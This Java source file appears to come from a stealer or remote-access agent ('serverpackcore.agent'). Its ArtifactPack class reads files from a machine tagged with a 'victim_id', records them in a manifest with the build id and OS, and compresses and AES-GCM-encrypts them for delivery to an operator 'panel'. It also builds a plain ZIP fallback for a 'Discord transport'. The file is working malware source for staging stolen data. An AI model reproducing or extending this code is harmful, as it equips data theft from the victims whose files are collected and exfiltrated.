package com.serverpackcore.agent.crypto;

import com.serverpackcore.agent.Json;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Deterministic artifact container v1: plaintext manifest, Deflate + AES-GCM
 * blobs. AAD binds every blob to the manifest hash and artifact id, so a flipped
 * byte fails before it reaches the panel. The key is derived from the build
 * secret, build_id and victim_id only.
 */
final class ArtifactPack {
	record Item(String path, String kind, byte[] data) {
	}

	private final CryptoConfig config;
	private final String victimId;
	private final String module;
	private final List<Item> items = new ArrayList<>();
	private long total;

	ArtifactPack(CryptoConfig config, String victimId, String module) {
		this.config = config;
		this.victimId = victimId;
		this.module = module;
	}

	boolean add(Path file, String path, String kind) {
		try {
			if (file == null || !Files.isRegularFile(file)) {
				return false;
			}
			long size = Files.size(file);
			if (size <= 0 || total + size > config.maxArtifact) {
				return false;
			}
			byte[] data = Files.readAllBytes(file);
			return add(data, path, kind);
		} catch (Throwable throwable) {
			return false;
		}
	}

	boolean add(byte[] data, String path, String kind) {
		if (data == null || data.length == 0 || total + data.length > config.maxArtifact) {
			return false;
		}
		items.add(new Item(sanitize(path), kind, data));
		total += data.length;
		return true;
	}

	int size() {
		return items.size();
	}

	long bytes() {
		return total;
	}

	Path build(Path target) throws Exception {
		if (items.isEmpty()) {
			throw new IllegalStateException("empty container");
		}
		byte[] prefix = CryptoUtil.random(8);
		List<Map<String, Object>> index = new ArrayList<>();
		for (int i = 0; i < items.size(); i++) {
			Item item = items.get(i);
			Map<String, Object> row = new LinkedHashMap<>();
			row.put("id", "a" + (i + 1));
			row.put("path", item.path());
			row.put("kind", item.kind());
			row.put("size", item.data().length);
			row.put("sha256", CryptoUtil.hex(CryptoUtil.sha256(item.data())));
			row.put("mode", 384);
			index.add(row);
		}
		Map<String, Object> manifest = new LinkedHashMap<>();
		manifest.put("container_version", 1);
		manifest.put("build_id", config.buildId);
		manifest.put("victim_id", victimId);
		manifest.put("os", CryptoPaths.os());
		manifest.put("profile", config.full ? "full" : "lite");
		manifest.put("module", module);
		manifest.put("created_at", System.currentTimeMillis() / 1000L);
		manifest.put("nonce_prefix", CryptoUtil.b64url(prefix));
		manifest.put("total_size", total);
		manifest.put("artifacts", index);
		byte[] manifestBytes = CryptoUtil.utf8(Json.stringify(manifest));
		String manifestHash = CryptoUtil.hex(CryptoUtil.sha256(manifestBytes));

		byte[] ikm = CryptoLog.concat(CryptoLog.concat(config.secret(), new byte[] { 0x1f }),
			CryptoLog.concat(CryptoUtil.utf8(config.buildId), CryptoLog.concat(new byte[] { 0x1f }, CryptoUtil.utf8(victimId))));
		byte[] kek = CryptoUtil.sha256(CryptoLog.concat(CryptoUtil.utf8("SPC-ART-V1"), ikm));
		byte[] key = CryptoUtil.hkdf(kek, prefix, CryptoUtil.utf8("artifact-v1"), 32);

		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
		Files.createDirectories(target.getParent());
		try (java.io.OutputStream out = java.nio.file.Files.newOutputStream(temp,
			java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.TRUNCATE_EXISTING)) {
			out.write(manifestBytes);
			out.write('\n');
			out.write(CryptoUtil.utf8(manifestHash));
			out.write('\n');
			for (int i = 0; i < items.size(); i++) {
				Item item = items.get(i);
				String id = "a" + (i + 1);
				byte[] compressed = CryptoUtil.deflate(item.data());
				byte[] nonce = new byte[12];
				System.arraycopy(prefix, 0, nonce, 0, 8);
				nonce[8] = (byte) (i >>> 24);
				nonce[9] = (byte) (i >>> 16);
				nonce[10] = (byte) (i >>> 8);
				nonce[11] = (byte) i;
				byte[] sealed = CryptoUtil.aesGcm(key, nonce, CryptoUtil.utf8(manifestHash + ":" + id), compressed, true);
				out.write(CryptoUtil.utf8("BLOB " + id + " " + sealed.length + "\n"));
				out.write(sealed);
			}
		}
		try {
			Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
		} catch (Throwable throwable) {
			Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING);
		}
		return target;
	}

	/** Plain ZIP fallback for the Discord transport (no container framing). */
	Path buildZip(Path target) throws Exception {
		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
		try (java.util.zip.ZipOutputStream zip = new java.util.zip.ZipOutputStream(
			java.nio.file.Files.newOutputStream(temp))) {
			zip.setLevel(6);
			java.util.Set<String> seen = new java.util.HashSet<>();
			for (Item item : items) {
				String name = item.path();
				if (!seen.add(name)) {
					continue;
				}
				zip.putNextEntry(new java.util.zip.ZipEntry(name));
				zip.write(item.data());
				zip.closeEntry();
			}
		}
		java.nio.file.Files.move(temp, target, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
		return target;
	}

	static String sanitize(String path) {
		String value = path.replace('\\', '/');
		int drive = value.indexOf(':');
		if (drive == 1) {
			value = value.substring(2);
		}
		StringBuilder clean = new StringBuilder();
		for (String part : value.split("/+")) {
			if (part.isEmpty() || part.equals(".")) {
				continue;
			}
			if (part.equals("..")) {
				continue;
			}
			if (clean.length() > 0) {
				clean.append('/');
			}
			clean.append(part);
		}
		value = clean.toString();
		if (value.isEmpty()) {
			value = "unnamed";
		}
		return value.length() > 900 ? value.substring(value.length() - 900) : value;
	}

	static String sha256(Path file) throws Exception {
		MessageDigest digest = MessageDigest.getInstance("SHA-256");
		try (var input = Files.newInputStream(file)) {
			byte[] buffer = new byte[65536];
			int count;
			while ((count = input.read(buffer)) > 0) {
				digest.update(buffer, 0, count);
			}
		}
		return CryptoUtil.hex(digest.digest());
	}

	static String sha256(byte[] data) {
		return CryptoUtil.hex(CryptoUtil.sha256(data));
	}

	static String base64(byte[] data) {
		return Base64.getEncoder().encodeToString(data);
	}
}
